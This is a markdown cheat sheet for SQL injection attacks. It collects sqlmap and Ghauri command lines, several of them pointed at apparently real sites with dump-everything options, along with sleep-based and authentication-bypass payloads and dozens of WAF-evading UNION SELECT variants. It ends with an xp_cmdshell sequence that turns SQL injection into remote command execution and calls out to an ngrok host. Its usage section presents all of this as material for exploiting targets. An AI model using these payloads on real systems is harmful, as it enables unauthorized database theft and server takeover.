
---

### **SQL Injection Resources**

#### **1. Tools**
- **SqliSniper**:
  ```bash
  https://github.com/danialhalo/SqliSniper
  ```
- **Bypass WAF SQLMap**:
  ```bash
  https://github.com/gagaltotal/Bypass-WAF-SQLMAP/blob/master/WAF-SQLMap-Full
  ```

#### **2. Captcha Bypass**
- **HackerOne Report**:
  ```bash
  https://hackerone.com/reports/1018621
  ```

#### **3. SQL Injection Payloads**
- **Gist by v3rlly**:
  ```bash
  https://gist.github.com/v3rlly/6a81e4cb1de1ce00dc30890adf5db0cd?fbclid=IwAR2_cofODxhHoSPdvtNQ-3BdxN5Zyzx78As4DEOFaL281EUdSAfVkN7dl-M
  ```

#### **4. SQLMap Commands**
- **Basic SQLMap Command**:
  ```bash
  sqlmap -u "URL" --random-agent --tamper="between,randomcase,space2comment" -v 2 --dbs --level 5 --risk 3 --batch --smart
  ```
- **Advanced SQLMap Command**:
  ```bash
  sqlmap -u "https://login.wellhive.com/oauth2/default/v1/authorize?client_id=0oah0y4hsmM9UWgZi4h5&code_challenge=_xwMoSpRTma4yDsVmAIqv3kFhUaPM1_89TdG54bMKxE&code_challenge_method=S256&nonce=aeVdd3T7rvLMZBkGsNi1w8zv3Njl6BFhl6Igpblqbzx4eETCxzcK2HhBczzCZvpl&redirect_uri=https%3A%2F%2Fapp.wellhive.com%2Flogin%2Fcallback&response_type=code&state=HXwRnNUaVjQlrDyXuKZBCU0xXr1nxnWMLfDXQ7WVUOUDbbeaULFVCKe1V2SLkGpy&scope=openid%20email" --hex --skip-waf --dbs --risk 3 --level 5 --current-db Altibase --skip-waf --random-agent
  ```

#### **5. SQL Injection Techniques**
- **Defeating Length Filters**:
  ```bash
  https://kuldeep.io/posts/defeating-length-filters-to-dump-the-database-sqli/
  ```
- **MySQL Port Open**:
  ```bash
  https://medium.com/@konqi/exploiting-grafana-to-achieve-remote-command-execution-5eb0f99cb107
  ```
- **Sleep Payload**:
  ```bash
  - 0’XOR(if(now()=sysdate(),sleep(6),0))XOR’Z
  - 63770’XOR(if(now()=sysdate(),sleep(6),0))XOR’Z
  - a%3C%22+UNION+SELECT+SLEEP(20);--+-
  
  ```
  
- **PortSwigger SQL Injection Cheat Sheet**:
  ```bash
  https://portswigger.net/web-security/sql-injection/cheat-sheet
  ```
- **NotSoSecure SQL Injection Lab**:
  ```bash
  https://notsosecure.com/sql-injection-lab
  ```

#### **6. SQL Injection Payloads**
- **Information Schema**:
  ```bash
  '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
  ```
- **Admin Bypass**:
  ```bash
  admin%bf'or+1=1+--+&
  ```
- **XOR Sleep Payload**:
  ```bash
  'XOR(if(now()=sysdate(),sleep(33),0))OR'
  ```
- **Sitemap SQL Injection**:
  ```bash
  target[.]com/sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)#
  ```
- **SQLMap with Tamper**:
  ```bash
  sqlmap -r req3.txt -p commitment --force-ssl --level 5 --risk 3 --dbms=”MYSQL” --hostname --current-user --current-db --dbs --tamper=between --no-cast
  ```

#### **7. Bypass SQL Union Select**
- **Union Select Bypass Payloads**:
  ```bash
  /*!50000%55nIoN*/ /*!50000%53eLeCt*/
  %55nion(%53elect 1,2,3)-- -
  +union+distinct+select+
  +union+distinctROW+select+
  /**//*!12345UNION SELECT*//**/
  /**//*!50000UNION SELECT*//**/
  /**/UNION/**//*!50000SELECT*//**/
  /*!50000UniON SeLeCt*/
  union /*!50000%53elect*/
  +#uNiOn+#sEleCt
  +#1q%0AuNiOn all#qa%0A#%0AsEleCt
  /*!%55NiOn*/ /*!%53eLEct*/
  /*!u%6eion*/ /*!se%6cect*/
  +un/**/ion+se/**/lect
  uni%0bon+se%0blect
  %2f**%2funion%2f**%2fselect
  union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
  REVERSE(noinu)+REVERSE(tceles)
  /*--*/union/*--*/select/*--*/
  union (/*!/**/ SeleCT */ 1,2,3)
  /*!union*/+/*!select*/
  union+/*!select*/
  /**/union/**/select/**/
  /**/uNIon/**/sEleCt/**/
  +%2F**/+Union/*!select*/
  /**//*!union*//**//*!select*//**/
  /*!uNIOn*/ /*!SelECt*/
  +union+distinct+select+
  +union+distinctROW+select+
  uNiOn aLl sElEcT
  UNIunionON+SELselectECT
  /**/union/*!50000select*//**/
  0%a0union%a0select%09
  %0Aunion%0Aselect%0A
  %55nion/**/%53elect
  uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
  %252f%252a*/UNION%252f%252a /SELECT%252f%252a*/
  %0A%09UNION%0CSELECT%10NULL%
  /*!union*//*--*//*!all*//*--*//*!select*/
  union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
  /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
  +UnIoN/*&a=*/SeLeCT/*&a=*/
  union+sel%0bect
  +uni*on+sel*ect+
  +(UnIoN)+(SelECT)+
  +(UnI)(oN)+(SeL)(EcT)
  +’UnI”On’+'SeL”ECT’
  +uni on+sel ect+
  +/*!UnIoN*/+/*!SeLeCt*/+
  /*!u%6eion*/ /*!se%6cect*/
  uni%20union%20/*!select*/%20
  union%23aa%0Aselect
  /**/union/*!50000select*/
  /^.*union.*$/ /^.*select.*$/
  /*union*/union/*select*/select+
  /*uni X on*/union/*sel X ect*/
  +un/**/ion+sel/**/ect+
  +UnIOn%0d%0aSeleCt%0d%0a
  UNION/*&test=1*/SELECT/*&pwn=2*/
  un?<ion sel="">+un/**/ion+se/**/lect+
  +UNunionION+SEselectLECT+
  +uni%0bon+se%0blect+
  %252f%252a*/union%252f%252a /select%252f%252a*/
  /%2A%2A/union/%2A%2A/select/%2A%2A/
  %2f**%2funion%2f**%2fselect%2f**%2f
  union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
  /*!UnIoN*/SeLecT+
  %6c%75%33%6b%79%31%33' AND 1=CAST((SELECT version()) AS int) --
  ```

#### **8. Automated SQL Injection Testing**
- **Ghauri**:
  ```bash
  cat sql | while read host do;do ghauri -u $host --batch --level=3  -b --current-user --current-db --hostname --dbs ;done
  ```
- **SQLMap Batch Testing**:
  ```bash
  sqlmap -m sql -batch --random-agent --level 5 --risk 3
  ```
- **SQLMap with Tamper**:
  ```bash
  python3 /opt/sqlmap/sqlmap -u "https://eneftee-black[.]market/news.php?id=2" --batch --dbms=mysql --random-agent --level 5 --risk 3 --tamper=space2comment --dump-all --threads 10
  ```

---

### **How to Use This Information**
1. **Tools**:
   - Use tools like SqliSniper and SQLMap to automate SQL injection detection and exploitation.

2. **Captcha Bypass**:
   - Study the HackerOne report to understand how to bypass CAPTCHA mechanisms.

3. **Payloads**:
   - Experiment with different SQL injection payloads to bypass WAFs and other security measures.

4. **Techniques**:
   - Use advanced techniques like UNION SELECT bypass and length filter bypass to exploit SQL injection vulnerabilities.

5. **Automation**:
   - Automate SQL injection testing using scripts and tools like Ghauri and SQLMap.
### SQLI to RCE

```bash
; EXEC sp_configure ‘show advanced options’, 1; RECONFIGURE; EXEC sp_configure ‘xp_cmdshell’, 1; RECONFIGURE; —

;EXEC xp_cmdshell ‘ping xxxxxxxx.ngrok.io’; —

https://systemweakness.com/sql-injection-to-remote-command-execution-rce-dd9a75292d1d
```


---
- https://github.com/jhaddix/tbhm/blob/master/06_SQLi.md
- https://medium.com/@0x3adly/from-sql-injection-to-rce-leveraging-vulnerability-for-maximum-impact-2fb356907eed

